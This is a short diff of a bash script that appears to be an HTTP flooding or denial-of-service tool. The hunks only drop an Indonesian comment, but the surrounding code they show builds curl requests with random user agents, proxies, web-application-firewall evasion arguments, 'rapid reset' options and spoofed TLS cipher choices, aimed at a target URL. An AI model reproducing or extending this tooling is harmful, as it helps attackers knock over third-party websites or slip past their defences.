@@ -129,8 +129,7 @@ fi
         -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
         -w "%{time_total}|%{http_code}" \
         "$send_to_url")
-    else
-      # METODE GET: Menggunakan pembersihan yang sama agar header WAF terurai sempurna oleh curl
+    else      
       curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null \
@@ -273,8 +272,7 @@ fi
         -m 12 -A "$random_ua" -s -o /dev/null -d "$post_data" \
         -w "%{time_total}|%{http_code}" \
         "$send_to_url")
-    else
-      # METODE GET: Menggunakan pembersihan yang sama agar header WAF terurai sempurna oleh curl
+    else    
       curl_output=$(command curl $proxy_flag $cookie_flag ${waf_args//\"/} $rapid_reset_args \
         --tlsv1.3 --ciphers "$target_cipher" --tls13-ciphers "$target_tls13" \
         -m 12 -A "$random_ua" -s -o /dev/null \
